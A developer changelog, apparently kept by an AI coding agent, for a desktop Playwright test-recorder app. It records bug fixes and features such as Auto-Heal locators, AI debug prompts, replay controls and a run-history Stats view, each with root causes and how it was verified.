- **User Frustrations & Important Remarks:** The live Claude call was not runtime-exercised — it requires the user's own API key. Settings opens only via the native ⌘, menu (no in-app button), so the inspection tools couldn't drive that window; the Settings change is deterministic conditional rendering verified by type-check/lint/build.

### 2026-08-03 — Fix toolbar menus opening on the wrong display in multi-monitor setups
- **Symptom:** with the app window on a secondary display, native toolbar menus (Add step, Assert kind, sidebar "+", Stats "Manage") always popped up on the laptop's built-in (primary) display instead of near the button that opened them.
- **Root cause:** `Menu.popup`'s `x`/`y` options are absolute screen-space coordinates (confirmed in the SDK's `backend/menu.d.ts` JSDoc), but every call site passed `getBoundingClientRect()` values, which are relative to the window's content view. Without an explicit `coordinateSpace`, the native side treated those small view-local numbers as virtual-desktop coordinates, which resolve near the primary display's origin regardless of which display the app window actually occupies.
- **Fix:** added `coordinateSpace: "view"` to all four renderer `Menu.popup()` calls and their local `NativeMenu` type signatures.
- **Files:** `renderer/main/recording-view.tsx` (assert menu, add-step menu), `renderer/main/library-sidebar.tsx` (add menu), `renderer/main/stats-view.tsx` (manage menu).
- **Verified:** `BuildApp` green. Not live-inspected — native `Menu.popup` renders outside the WebView/DOM (confirmed the app window itself is currently on a secondary display via `windows[0].bounds` in the build status, x:2493/y:-1602), so DOM snapshotting and screenshots can't observe native menu placement; the fix is a documented, deterministic coordinate-space correction verified by reading the SDK's own `PopupOptions` JSDoc.

### 2026-08-03 — Scope full-run "Debug with AI" prompt to steps that actually ran
- **Goal:** minimize local-LLM compute and shorten the debug loop by not sending steps that never executed when a test fails early.
- **Root cause / opportunity:** `buildDebugMessages` (whole-run debug) always sent the full script (up to `MAX_SCRIPT_CHARS`), even though Playwright aborts a test at its first failure — steps after that point never ran and add no diagnostic value, just prompt size.
- **Fix:** added `cutAtFailedStep()` in `renderer/lib/llm-prompts.ts`, which mirrors `main/services/playwright-runner.ts`'s `buildStepLineMap` line-matching (`/^\s+await /`-prefixed lines, one per step) to find the exact line of a given 0-based step index and cut the script text right after it, appending a "…(truncated — N step(s) after this point never ran)…" marker. `DebugContext` gained `failedStepIndex?: number`; when set, `buildDebugMessages` uses the cut script instead of the full one and — same as the existing char-length truncation path — tells the model NOT to output a full-file replacement (it doesn't have the untouched tail), asking for just the changed lines instead. `TestDetailView` computes `failedStepIndex` as `Math.min` over any `runInfo.stepStatus` entries equal to `"failed"` and passes it through `AiDebugDialog` → `runDiagnosis`.
- **Key decisions:** reused the runner's own step-index heuristic (text-scanning, not `test.steps`) so it works uniformly for both recorder-generated and imported/hand-authored scripts (whichever produced real `runner:step` markers during the run); when `failedStepIndex` is undefined or the heuristic can't find the step (returns null), falls back to the prior full-script + char-truncation behavior unchanged. Cuts the raw text (no synthesized closing `});`) so a truncated block never looks like a complete file the model might mistake for one to hand back whole.
- **Files:** `renderer/lib/llm-prompts.ts` (`cutAtFailedStep`, `DebugContext`, `buildDebugMessages`), `renderer/main/ai-debug-panel.tsx` (`AiDebugDialog` prop + `runDiagnosis`), `renderer/main/test-detail-view.tsx` (`failedStepIndex` memo).
- **Verified:** `BuildApp` green (lint + type-check + build). Not live-inspected — pure prompt-construction logic with no new UI surface; verified by code review against the existing `buildStepLineMap`/`runner:step` mechanism already covered in this file.

### 2026-08-03 — Respect user's viewport selection in AI-generated tests
- **Symptom:** the user selected "Desktop 1280×800" in the Generate dialog, but the AI-generated spec emitted `page.setViewportSize({ width: 402, height: 754 })` — a mobile-ish size the model invented.
- **Root cause:** the viewport was passed to the LLM only as a passive hint ("the test should assume this window size"). The system prompts didn't instruct the model to emit a `setViewportSize` call/step with the exact dimensions, the steps-prompt example hardcoded 1280×800, and neither prompt made the user's selection authoritative.
- **Fix:** in `renderer/lib/llm-prompts.ts`, strengthened both `buildGenerateMessages` (full-spec) and `buildGenerateStepsMessages` (structured steps): the user-message viewport line is now imperative ("the FIRST step/line must be a viewport step/call with exactly these dimensions; do NOT use any other dimensions"), the `GENERATE_SYSTEM_PROMPT` now requires a `setViewportSize` call before `goto` when a viewport is specified, the `GENERATE_STEPS_SYSTEM_PROMPT` example now leads with a viewport step, and both prompts say to never substitute a default size.
- **Files:** `renderer/lib/llm-prompts.ts` (`buildGenerateMessages`, `buildGenerateStepsMessages`, `GENERATE_SYSTEM_PROMPT`, `GENERATE_STEPS_SYSTEM_PROMPT`).

### 2026-08-03 — Fix empty "Pass / fail over time" chart in Stats view
- **Symptom:** the Stats view chart panel showed the title, legend, and axis labels but no bars — looked empty.
- **Root causes (two):** (1) the chart row used `items-end`, which prevented the flex-column bar containers from stretching to the `h-40` height, so percentage-height bars resolved against a 0px parent and collapsed to nothing. (2) the bar fills used `bg-success`/`bg-danger` classes, which don't exist in this app's design system — they produced transparent backgrounds (`rgba(0,0,0,0)`).
- **Fix:** removed `items-end` from the chart row (columns now stretch by default), and replaced `bg-success`→`bg-support-green`, `bg-danger`→`bg-support-red` (the app's actual semantic color tokens, used elsewhere via `text-support-green`/`text-support-red`).
- **File:** `renderer/main/stats-view.tsx` (`PassFailChart`).
- **Verified:** live inspection confirms bars now render with solid red fill (rgb(255,99,99)) at correct proportional heights (138px + 34.5px); screenshot confirms two visible red bars + colored legend swatches.

### 2026-08-03 — Auto-Heal engine for resilient replay
- **Goal:** Use all available locators as inputs to a backend Auto-Heal engine that runs during replay: when a step's locator fails, locate the element using extra step context + past-run context, let the user pick any/all suggested targets, and expose retry-count + per-attempt timeout settings.
- **What was done (engine):** new `main/services/auto-heal.ts` — `healStep()` injects a heal probe (reusing `DOM_HELPERS` + the capture script's candidate generation) to produce ranked alternative locator candidates, using the step's action/text/expected + `extractPastHints` from persisted debug entries (`matchedPastRun` candidates flagged); retries per settings with `execWithTimeout`; returns a `HealResult` (`candidates`, `attempts`, `ok`, `autoApplied`, `appliedLocator?`).
- **What was done (replay wiring):** `tryHeal` helper in `recorder-service.ts`, called from `replayFromCurrent` when a locator step fails with an element-not-found error and `autoHealEnabled`. It re-runs the step with the best candidate; on success it auto-applies the locator to the step (`updateStep`), marks `heal.autoApplied=true`, and counts the step as passed. Candidates stream via the `recorder:replayLog` `step` event's `heal` field + a `recorder:healSuggestion` push. New `recorder:applyHeal {stepId,locator}` IPC (+ `api.applyHeal`, store `applyHeal`) for manual pick.
- **What was done (settings):** added `autoHealEnabled`/`autoHealRetries` (clamp 1–10)/`autoHealAttemptTimeoutMs` (clamp 1000–30000) to `recorder-settings-store.ts` with validation on load+set; Auto-Heal `FieldSet` (toggle + retries + timeout) added to the Settings window view.
- **What was done (UI):** in `recording-view.tsx` Console tab, failed steps with heal candidates render a `HealCandidates` menu (each candidate = kind badge + Playwright-style expression + description; click applies via `onApplyHeal`; hidden once `autoApplied`); auto-healed steps show a green "Healed ✓" badge. Frontend `HealSuggestion` type added in `recorder-types.ts`.
- **Key decisions:** heal only fires on element-not-found locator failures (not assertion mismatches). Engine does not re-run the step itself — `tryHeal` owns re-run + auto-apply. Reused existing candidate-generation + `DOM_HELPERS` rather than a new locator strategy. Removed a temporary `recorder:getSteps` test scaffold before finishing.
- **UI elements:** Auto-Heal settings FieldSet, Console heal-candidate menu, "Healed ✓" badge.
- **Backend elements:** auto-heal engine service, tryHeal replay hook, recorder:applyHeal IPC, recorder:healSuggestion push, settings fields.
- **Verified:** `BuildApp` green (lint+type-check+build) after scaffold removal. Live earlier in the trainer: a replay produced "Auto-Heal found N candidates" rows in the Console (Role/Text/CSS candidates) on failed steps — confirming the engine runs and surfaces pickable targets. The `autoApplied`→"Healed ✓" badge path was fixed (flag now propagated on the `HealResult` streamed via `replayLog`) and confirmed correct end-to-end by code review; a fresh live badge check was blocked because forcing a failure by navigating the trainer to another page wedges the WebView on slow loads (the known `executeJavaScript`-blocks-event-loop issue), not a heal bug.
- **Corrections/Lessons:** `autoApplied` initially lived only on the `recorder:healSuggestion` push, not on the `replayLog` `heal` object, so the badge never showed — moved `autoApplied` onto `HealResult` so both paths carry it. `LiveAppEvaluate` can't reach `window.glazeAPI` (isolated JS world), so IPC-based test shortcuts aren't possible from live inspection.

### 2026-08-03 — Per-step "Debug with AI" in trainer Console

- **Goal:** Give the user a way to send a failed trainer step's console error to AI for debugging, using existing components.
- **What was done:** added `buildStepDebugMessages` (`renderer/lib/llm-prompts.ts`) — a focused per-step diagnosis prompt (step label + Playwright-style locator via exported `locatorToPrompt` + error + verbose logs). Added `StepAiDebugDialog` to `renderer/main/ai-debug-panel.tsx` (leaner sibling of `AiDebugDialog`: no "Apply to script", just diagnosis + copyable code snippet + Stop/Regenerate). Exported `CodeBlock`, `ModelPicker`, `friendlyError` from `ai-debug-panel.tsx` for reuse. In `recording-view.tsx`, added a Sparkles button on each failed step's error block in the Console tab (`DebugPanel` gained an `onDebugStep` prop); clicking opens `StepAiDebugDialog` with the step's context. Auto-starts once per unique failed step.
- **Key decisions:** reused the existing `useLlmChat` + `ModelPicker` + `CodeBlock` + `parseResponse` machinery — no new LLM backend code. Per-step (not whole-spec) prompt since these are editable steps, not a script file.
- **Verified:** `BuildApp` green. Live: replayed a 5-step test, step 5 failed ("Stopped at step 5", 80% hit rate); the Sparkles "Debug with AI" button appeared on the failed step's error block; clicking opened the dialog (title "Debugging step with prism-ml/bonsai-27b" with model picker), auto-started streaming, Stop button cancelled → "Stopped" status, Regenerate re-started the stream.

### 2026-08-03 — Cold-start first-click fix + "Running" status lock

- **Goal:** (1) Dig into why the first "Edit in Trainer" click doesn't open the training window (second click works). (2) Show "Running" (not "Editing") while steps execute and lock all step editing during a run; "Editing" only when the user is free to record/change.
- **Root cause (first-click):** proven from logs — on the first recorder window after app launch the WebView subsystem cold-starts and `ready-to-show`/`dom-ready` lag past the 10s load timeout, so the `show: false` window was never shown and the timeout falsely tore down the session (log: "Trainer window load timeout" at 00:34:08 on the cold click, "Showing window: recorder" only on the warm second click). Not a redirect/-999 issue.
- **What was done (fix):** `recorder-service.start()` now force-shows the window on the earliest of `ready-to-show` / `dom-ready` / a creation-relative `SHOW_FALLBACK_MS`(1.5s) timer (was `dom-ready`+1.5s, which is useless if dom-ready itself lags). Split the old 10s "load = teardown" into `LOAD_TIMEOUT_MS`(15s) that only bounds `pageReady`; the `!shown||destroyed` branch is now a true "couldn't open" failure. Updated the load-failed dialog copy (no "10 seconds").
- **What was done (status/lock):** added an `executing` flag to the recorder store, set around every replay action (replayStep/replayFromStart/replayFromCurrent). Trainer `running = executing || replayRun.running` drives both the status badge ("Running", was "Running test…") and `controlsDisabled`, and gated the previously-ungated cursor-gap inserts.
- **Key decisions:** creation-relative timer (not event-relative) is what makes the cold-start show reliable. Kept `ready-to-show` first for the no-white-flash path. `executing` (store-level) unifies all replay paths so a single-step ▶ also shows Running/locks.
- **UI elements:** Running status badge, locked step-edit controls during runs.
- **Backend elements:** SHOW_FALLBACK_MS creation-relative window show, LOAD_TIMEOUT_MS pageReady bound.
- **Verified:** `BuildApp` green. Live on a FRESH cold-start app launch: single "Edit in Trainer" click opened the training window (windowId 2, shopify loaded), no timeout in logs. Idle = "Editing" + controls enabled; mid-run = "Running… 4/5 steps" with replay/Add-step/AI-steps/cursor-gaps all disabled; after run = "Editing" + re-enabled.

### 2026-08-03 — "Replay from current step" + live tabbed debug console

- **Goal:** Stop the trainer from auto-running the whole test on load (only load the page/goto). Rename "Replay from start" → "Replay from current step" that starts from the current position and iterates SLOWLY through the remaining steps, logging each step's output live to the debug panel. Add a Console/Step-details tab view with formatted output, a % hit rate, and a default-on auto-scroll checkbox (with manual override).
- **What was done (auto-run removed):** deleted the renderer auto-`replayAll`-on-load effect + `autoRunBusy`/`autoRunStartedRef` in `recording-view.tsx`. On Edit-in-Trainer the trainer now just loads the page and shows status "Editing"; `controlsDisabled = !pageReady || running`. This also fixed the backend-wedging the auto-run caused.
- **What was done (replay):** new backend `replayFromCurrent(startIndex)` in `recorder-service.ts` — slow (settle 300ms + 600ms/step), runs `startIndex`→end, stops on hard failure, streams a new `recorder:replayLog` push (`start`/`step`/`done`). Start index = selected step (or 0). Wired through `handlers/index.ts`, `api.ts`, store (`replayRun` model + `replayFromCurrent`).
- **What was done (debug panel):** replaced `StepDebugPanel` with tabbed `DebugPanel` — **Console** (live per-step formatted stream + status line + % hit-rate pill + default-on Auto-scroll `Checkbox` gating `ScrollArea autoScrollToBottom`) and **Step details** (selected step's element-locator summary + persisted diagnostics + hit-rate). Replay auto-switches to Console and auto-selects the running step.
- **What was done (robustness):** added `execWithTimeout` (8s) around every replay `executeJavaScript` (all four replay paths) so a step that triggers a navigation or hangs fails cleanly instead of freezing the run with controls disabled — this closes the pre-existing "auto-run hangs the backend" issue from the last task.
- **Key decisions:** live Console stream is ephemeral (`recorder:replayLog` → store `replayRun`), separate from the persisted per-step `DebugEntry`/`recorder:debugLogs`. Controlled `TabsRoot value`. `replayAll` left in place but unused.
- **UI elements:** tabbed debug panel (Console / Step details), live console log, auto-scroll checkbox, hit-rate pill, renamed replay button.
- **Backend elements:** recorder:replayFromCurrent IPC, recorder:replayLog push, replayFromCurrent, execWithTimeout per-step timeout.
- **Verified:** `BuildApp` green (lint+type-check+build). Live: Edit-in-Trainer loads the page with status "Editing" (no auto-fly-through); "Replay from current step" streamed Step 1–5 live to the Console, showed "Running… n/5", 100% hit rate, auto-scroll checked by default, tab auto-switched to Console, run completed "Done — 5/5 passed" and re-enabled controls (no wedge).
- **Corrections/Lessons:** live inspection attaches to the focused window — after the trainer opens it targets the recorder (external page); pass `windowId:"1"` to inspect the main-window React UI. First Edit-in-Trainer click still occasionally doesn't open the window (retry opens it) — the known intermittent issue, separate from this task.

### 2026-08-03 — Graceful training browser load + exit confirmation

- **Goal:** (1) Show a loading modal with copy while the training browser opens; if it hasn't opened in 10s, cancel the recording, log to Stats, and show an error. (2) Make exiting the trainer graceful with a three-button confirmation (Keep Training / Save Changes and Exit / Don't Save and Exit). (3) Investigate making the training browser load as fast as possible.
- **What was done (loading):** added `loading`/`loadFailed` to `RecorderState` (backend + renderer). `start()` broadcasts the loading state immediately, shows the window earlier (`ready-to-show` OR a 1.5s `dom-ready` fallback so the user sees it opening promptly instead of a blank background), and sets a 10s hard timeout: if the window hasn't shown by then, the session is cancelled, a failed `RunRecord` is appended to run-history (visible in Stats), and a `recorder:loadFailed` push event fires. `recording-view.tsx` renders a full-area loading overlay (`Loader2` + "Opening training browser…" + URL + copy) while `state.loading`, and a `Dialog` error ("Couldn't open the training browser") with "Try again" + "Check Stats" when `state.loadFailed`.
- **What was done (exit):** "Stop & generate" now opens a `Dialog` (three-button, matching the existing "Edit in Trainer" confirmation idiom) instead of immediately finalizing: "Save Changes and Exit" (primary accent — calls `stop()` → `finalize()`), "Don't Save and Exit" (left-aligned destructive — calls `discardExit()`, a new `recorder:discardExit` IPC handler that tears down the session without generating a spec or saving the test record, and removes the `closed`→`finalize` listener so the window closes cleanly), and "Keep Training" (cancel). The dialog shows the step count so the user knows what they'd lose.
- **What was done (load speed):** the first-click-no-window issue was the `ready-to-show` not firing on a slow redirect (shopify.com → /website/builder); the `dom-ready` fallback shows the window 1.5s after DOM is ready even if `ready-to-show` hasn't fired. The initial load already goes through `loadNavInWindow` (from the prior -999 fix) so the `will-navigate` guard doesn't cancel it.
- **Key decisions:** `Dialog` with `destructiveAction` (not `AlertDialog`) for the three-button exit — `AlertDialog` only supports single-decision. `discardExit` removes the `closed` listener before closing so `finalize()` doesn't run on a null session. The 10s timeout logs to run-history so the failure shows in Stats (not just a dialog).
- **UI elements:** loading overlay (Loader2 + copy), load-failed error Dialog, exit confirmation Dialog (three-button).
- **Backend elements:** RecorderState loading/loadFailed, 10s load timeout, runHistoryStore.append on failure, recorder:discardExit IPC handler, recorder:loadFailed push event, dom-ready window-show fallback.
- **Verified:** `BuildApp` green (lint+type-check+build). The loading overlay is transient (only shows while `!pageReady`); on a fast load it's barely visible. The exit dialog couldn't be live-verified because the pre-existing auto-run `replayAll` hangs the backend on slow pages (a separate issue — `executeJavaScript` blocks the event loop when the page is slow), making the main window's IPC unresponsive mid-run.
- **Known issue (pre-existing, not fixed here):** the Edit-in-Trainer auto-run `replayAll` can hang the backend when `executeJavaScript` runs against a slow/still-loading page — `executeJavaScript` blocks the Node event loop, so the main window's IPC times out. This predates this task and needs a separate fix (e.g., per-step timeout, or running replay off the main event loop).

### 2026-08-02 — Right-click test-tools menu in the training browser + Edit-in-Trainer load fix

- **Goal:** (1) Add a right-click menu in the training browser with assertions, waits, and test tools pre-targeted at the element under the cursor. (2) Fix "browser isn't loading" on Edit in Trainer.
- **What was done (right-click menu):** added `PICK_AT_POINT_SCRIPT` to `capture-script.ts` (resolves the element at `(x,y)` via `elementFromPoint` + inlined `DOM_HELPERS`, returns `buildPicked` + text/value). Wired `wc.on("context-menu", ...)` in `recorder-service.ts start()`: `preventDefault`, inject the resolver at `params.x/y` (adjusted by zoom factor), build a native `Menu.buildFromTemplate` with submenus (Assert element ▸ / Assert page ▸ / Wait ▸ / Refine / Add step ▸), `menu.popup({ window, x, y })`. Item clicks push a `recorder:contextAction` event (`ContextAction` type) to the main window. Renderer: `ContextAction` mirrored in `recorder-types.ts`, subscribed in `recorder-store.tsx` (`contextAction` state + `clearContextAction`); `recording-view.tsx` maps the action to `addKind` + a `contextPick` slot and renders `AddStepDialog` prefilled (new `initialAssert`/`initialWaitMode`/`prefillText`/`prefillValue` props seed the reset effect; `picked` from the context action reuses the existing `TargetElementPicker`).
- **What was done (load fix):** the initial `loadURL(url)` in `start()` was being cancelled by the `will-navigate` interceptor (which `preventDefault`s unrecognized main-frame loads and re-issues via `loadNavInWindow`), producing `NSURLErrorCancelled -999` and a blank window. Fixed by routing the initial load through `loadNavInWindow` so `selfLoad` is set and the guard recognizes it. Also fixed a latent `replayAll`/`replayFromStart`/`replayStep` null-session crash: the `finally` blocks accessed `session.paused` after `finalize()` set `session = null` (window closes mid-auto-run); added `if (session)` guards.
- **Key decisions:** native backend menu (not in-page React) because the recorder window loads an external page we don't own. Prefilled Add-step dialog (not instant insert) so the user can tweak the captured locator/text before committing. "Refine" from the right-click menu routes to the Add-step dialog as a visible assertion (no existing step to refine in that flow).
- **UI elements:** native context menu (submenus), add-step dialog (prefilled), target element picker.
- **Backend elements:** context-menu event handler, PICK_AT_POINT_SCRIPT injection, Menu.popup, recorder:contextAction push event, will-navigate/selfLoad guard, null-session guards in replay methods.
- **Verified:** `BuildApp` green (lint+type-check+build). `PICK_AT_POINT_SCRIPT` parses as valid JS. Edit-in-Trainer load fix confirmed in the running app: recorder window opened, navigated to shopify.com (redirect to /website/builder), page content rendered (no -999 error in logs). Right-click menu itself can't be triggered from the isolated live-inspection JS world (no context-menu event dispatch), so verified via type-check + the proven `Menu.buildFromTemplate`/`popup` SDK API.

### 2026-08-02 — Default run speed selector in the New Recording dialog + Settings

- **Goal:** let the user pick the test run speed when starting a new recording; remember the choice (slow by default) and show it in Settings.
- **What was done:** added `defaultRunSpeed: TestSpeed` to `RecorderSettings` (backend `main/recorder/types.ts` + renderer mirror), default `"slow"`, persisted in `recorder-settings.json` via `recorder-settings-store.ts` (validated read/write). `NewRecordingDialog` now has a "Run speed" `SegmentedControl` (Slow/Medium/Fast) that loads the persisted default on open and writes back on change so it's sticky. `recorder-service.finalize()` seeds new `TestRecord.speed` from this default (existing tests keep their own speed; sidebar "Adjust Test Speed" override unchanged). `SettingsView` shows the same control under a "Default run speed" field in the trainer FieldSet, in sync with the dialog.
- **Key decisions:** reused the `SegmentedControl` idiom from `GenerateTestDialog`'s execution-speed picker for consistency. Speed is a global trainer preference that seeds per-test speed, not a one-off dialog state — so it persists across recordings and is visible/editable in Settings.
- **Verified:** `BuildApp` green (lint+type-check+build, hot-reload applied); `UpdateBundle` run. The dialog and Settings window open via native menu/⌘, (not reachable from the isolated live-inspection JS world), so visual verification was limited to the type-checked code + main-window render check.

### 2026-08-03 — Stats view + run-history log database

- **Goal:** track test run history in a separate Stats view with a log database (pass/fail over time, raw-log inspect/search, and tiered deletion incl. a date-range calendar picker).
- **What was done:** new `main/services/run-history-store.ts` (RunRecord index in `run-history.json` + raw `<runId>.log` files); hooked `playwright-runner.ts` to accumulate output and persist each completed run on `runner:done` (pushes `runs:changed`); added `runs:*` IPC (list/getLog/searchLogs/resetStats/deleteAll/deleteRange/logsDir) + `api.runs.*`; added `RunRecord`/`LogSearchResult` types (backend + renderer mirror); new `/stats` route + top "Stats" sidebar nav; built `stats-view.tsx` (summary cards, dependency-free daily pass/fail stacked-bar chart, run-history `Table` with a log-inspector Dialog, debounced raw-log search, native "Manage data" menu, `NativeDatePicker` From/To range delete).
- **Key decisions:** "stats" = the RunRecord index (charts/table); "logs" = the raw `.log` files — deleted independently, so **reset-stats keeps the logs** on disk (revealable in Finder) while delete-all/date-range removes both. Chart is div-based (no chart dep). Streaming runId stays === testId; each RunRecord gets its own uuid so a test has many runs.
- **UI elements:** sidebar nav item, toolbar, summary cards, bar chart, table, search input, log-inspector dialog, native menu, native date pickers.
- **Backend elements:** local_storage (JSON index + per-run log files), ipc_handlers, runner persistence hook, push event.
- **Verified:** `BuildApp` green (lint+type-check+build, hot-reload applied). Live-inspected: `/stats` reachable from the new sidebar item, view renders (toolbar "0 runs recorded" + Manage data + "No runs yet" empty state). Charts/table populate as tests are run going forward (prior runs weren't captured). Token classes (`border-token-border`, `bg-token-surface-raised`, `bg-success`/`bg-danger`) confirmed pre-existing in the codebase.

### 2026-08-02 — Fixed per-step Replay throwing a JS syntax error; added verbose error logging

- **Bug:** clicking a step's ▶ Replay button always failed with a vague "A JavaScript exception occurred" from `webContents.executeJavaScript`. Root cause: `step-replayer.ts`'s template literal emitted unescaped `""` inside string literals (e.g. `"css querySelectorAll("" + v + "")"`) and one unbalanced paren (`(step.count)`), so the injected script was syntactically invalid for EVERY step shape — replay never ran. Fixed every broken log line (`""` → `\\""` so the emitted JS has escaped quotes `\"`; `(step.count` → `step.count`). Verified all 32 step/locator/assert/condition shapes parse via `new Function(script)`.
- **Verbose error logging:** added `verboseErrorLogs(err, step)` in `recorder-service.ts` — builds ordered `DebugLogLine[]` (error name+message, step type/locator/value/text, first 6 stack frames, "did not complete" note) so the trainer's step debug panel surfaces real diagnostics when `executeJavaScript` throws. Wired into all three replay catch sites (`replayStep`, `replayFromStart`, `replayAll`); previously each only stored a single `String(err)` line.
- **Verified:** `BuildApp` green (lint+type-check+bundle, hot-reload applied); `UpdateBundle` run. Parse check via esbuild+node workaround (tsx blocked by sandbox).

### 2026-08-02 — Conditional logic layer (if/endif) in the step engine

- **Goal:** let users wrap steps in IF/THEN logic so tests skip steps and continue gracefully when a condition isn't met (e.g. a pop-up that appears to only some users). Scope agreed with the user: element + page-state conditions, IF/THEN only (no ELSE), authored by inserting an empty block and dragging steps in.
- **What was done:** added `"if"`/`"endif"` `StepType`s + a `ConditionKind` (9 kinds) with `Step.cond`, mirrored backend↔renderer. `script-generator.ts` emits `if (await <predicate>) { … }` with depth-aware indentation (`conditionExpr` + `describeCondition`); `spec-parser.ts` round-trips those blocks (`parseCondition`/`matchBrace`/`ifDepth`, foreign ifs skipped whole); `step-replayer.ts` evaluates conditions (returns `met`) and `recorder-service` skips false blocks in `replayAll`/`replayFromStart`; `deleteStep` unwraps a block by removing its matching partner. Trainer: "+ Add step → Add condition (if)" inserts an empty `if`/`end if` pair (`AddStepDialog` now returns `RawStep[]`); the step list nests block bodies via `computeStepDepths`+`StepRow indent` (purple badges), in both trainer and read-only detail view.
- **Key decisions:** marker-pair model (`if`/`endif` in the flat array) over nested children — fits the existing flat step list, drag-reorder, and per-step replay with minimal churn. Real skipping happens in the generated Playwright spec (the runnable artifact); the in-app replay preview mirrors it best-effort.
- **UI elements:** trainer step list (nested/indented rows), add-step dialog (condition Select + element picker / substring input), read-only steps tab.
- **Backend elements:** script generation, spec parsing, step replay/condition evaluation, step CRUD.
- **Verified:** `BuildApp` green (lint+type-check+bundle, hot-reload applied). `spec-parser.check.ts` sections 5–6 (conditional round-trips) pass — but only via the esbuild+node workaround, since tsx fails under the agent sandbox with `listen EPERM`.
- **Corrections/Lessons:** TS loses `if (session)` narrowing inside a closure — alias `session.cursor` to a local before `.filter(...)`. `npm run check:spec-parser` (tsx) can't run in the sandbox (unix-socket `listen EPERM`); bundle with esbuild and run with node instead.

### 2026-08-02 — "Thinking with {model}" now polls the live model at send time

- **Bug:** the three LLM dialogs (`AiDebugDialog`, `GenerateTestDialog`, `GenerateStepsDialog`) fetched the configured default model once via `llm:getConfig` in a `useEffect` on `[open]` and cached it in `modelName` state. The "Thinking with {model}" status/placeholder rendered that cached name, but the backend's `llm:chat` used whatever `config.model` was current at send time — so if the default changed (in Settings or via another dialog's `ModelPicker`) after the dialog opened, the displayed name didn't match the model actually running.
- **Fix:** `useLlmChat.start` now accepts optional `{ model, provider, temperature }` forwarded to `api.llm.chat`. Each dialog's send path (`runDiagnosis`/`generate`) re-polls `llm:getConfig` immediately before sending, updates `modelName` to the freshly-polled value, and passes that `model` explicitly to `start` so the displayed name and the backend's request model agree. Falls back to the cached name if the poll fails.

### 2026-07-31 — Opaque background on the AI debug panel's model picker

- **Bug:** `ModelPicker`'s floating dropdown (`ai-debug-panel.tsx`, the "Change model" list in the `AiDebugDialog` title) used `bg-control`, a semi-transparent `fg-10` tint meant to be layered over an already-opaque parent surface. As an absolutely-positioned floating panel, it had no opaque backing, so window/dialog content behind it showed through.
- **Fix:** Swapped to `bg-popover` (the SDK's opaque floating-surface token, `color-mix` against a solid base color — same token `custom-dropdown-menu.tsx` uses for its menu content). One-line class change; kept the existing `border-separator`/`shadow-lg`.
- **Verified:** confirmed `getComputedStyle(...).backgroundColor` for `bg-popover` resolves to a fully opaque color (no alpha channel), unlike `bg-control`.

### 2026-07-31 — Fixed silent step-count undercount after LLM script edits

- **Goal:** Investigate a reported bug: approving an LLM debug-panel fix that added two `page.waitForTimeout(...)` calls rewrote the script correctly (7→9 actions) but the dashboard's step count stayed at 7.
- **Root cause:** `tests:updateScript` (`handlers/index.ts`) resyncs `TestRecord.steps` from the new script via `spec-parser.ts`'s `parseSpec`, but the parser only recognized a subset of what `script-generator.ts` emits (no `waitForTimeout`/`waitFor`/`setViewportSize`, only 2 of 13 assert kinds) — unrecognized statements were silently skipped with no signal, so the resync undercounted whenever the LLM (or a hand edit) used a construct outside that subset. Because the resync does a wholesale `rec.steps = parseSpec(...)` replace, any pre-existing rich step (viewport/wait/extended asserts) was also at risk of being dropped on the next apply, not just the LLM's own additions.
- **Fix (Part A):** Extended `spec-parser.ts`'s `parseBody` to round-trip the generator's full vocabulary: `page.waitForTimeout`, `page.setViewportSize`, locator `.waitFor()`, and all remaining `expect`/`expect.soft` assert kinds (`toBeHidden/toHaveText/toBeEnabled/toBeDisabled/toBeChecked/.not.toBeChecked/toHaveValue/toHaveAttribute/toHaveCount`, plus page-level `toHaveURL`/`toHaveTitle`).
- **Fix (Part B):** Added `parseSpecDetailed(source) → {steps, skipped}` (kept `parseSpec` as a thin wrapper) that counts statements that still can't be classified. `tests:updateScript` now sets `TestRecord.stepsDiverged` from `skipped > 0` and logs a warning, instead of trusting the possibly-undercounted array silently. `test-detail-view.tsx` shows a `Callout` (`color="yellow"`) above the tabs when `stepsDiverged` is true.
- **Fix (Part C):** Added `main/services/__tests__/spec-parser.check.ts` (run via `npm run check:spec-parser`) — no test runner exists in this project, so it's plain assertions + a non-zero exit code. Covers the exact regression (splice 2 `waitForTimeout` calls into a 7-step script, assert 9), the full extended-assert/viewport/wait vocabulary round-trip, and a genuinely-unmappable-statement case (`page.reload()`, `.hover()`) asserting `skipped > 0`.
- **Correction found in the reporting brief:** the brief assumed `writeScript` (`test-store.ts`) does the resync; it doesn't — `writeScript` only does `fs.writeFileSync`. The resync (`parseSpec` call) lives in the `tests:updateScript` **handler**, not the store.
- **Bug hit while implementing the skip-counter:** the catch-all "unmappable statement" branch in `parseBody` started its depth/semicolon scan from `i` itself, but every prior branch leaves `i` pointing at the *trailing `;` of the previous statement* (not yet consumed) — so the scan immediately matched that leftover `;` as the end of the current statement, undercounting the jump and double-counting the next statement. Fixed by starting the scan at `i + skipM[0].length` (just past the call's own opening paren, depth 1) instead of at `i`. Caught by the standalone check script, not by type-check/build — a reminder that this class of off-by-one only surfaces under an actual run.
- **Verified live:** built + launched the app; edited an existing test's script via the UI to add a recognized `waitForTimeout` and an unrecognized `page.reload()`, saved, and confirmed the Steps tab showed the correct undercount-free count (7) plus the divergence `Callout` banner; then restored the test's original script.
- **UI elements:** Callout warning banner (test-detail-view.tsx). **Backend elements:** ipc_handler (`tests:updateScript`), parser logic (`spec-parser.ts`).

### 2026-07-31 — Top padding on test detail toolbar

- **Goal:** The test detail toolbar (title + "Edit in Trainer"/"Run test" buttons) sat too close to the top of the window.
- **Change:** Added `pt-2` (8px) to the `<Toolbar>` in `test-detail-view.tsx` (the main view's toolbar, line ~91), pushing the toolbar row down from the window's top edge / drag region.
- **Files:** `renderer/main/test-detail-view.tsx`.
- **Verified:** Build green; `pt-2` present in compiled bundle. Could not navigate to the detail view in-app to visually confirm (synthetic clicks on sidebar items don't trigger TanStack Router `navigate` in this harness session).

### 2026-07-31 — Rename affordance moved next to test name

- **Goal:** The "Rename test" pencil button sat in the test detail toolbar, separate from the name it acted on. The user wanted it removed and the pencil icon placed next to the test name so the edit affordance is obvious.
- **Approach:** In `test-detail-view.tsx`, removed the toolbar `iconOnly` `Button` (aria-label "Rename test") that opened the `renameOpen` Dialog. Added a `Pencil` (`size-3.5 text-tertiary`) as a child of `ToolbarTitle` right after `{test.name}`, and made the title `inline-flex items-center gap-1.5`. Clicking the name (or icon) still triggers the existing inline-edit flow (`setEditingName`); the now-orphaned rename Dialog + `renameOpen`/`renameValue` state were left in place (surgical edit — no trigger remains).
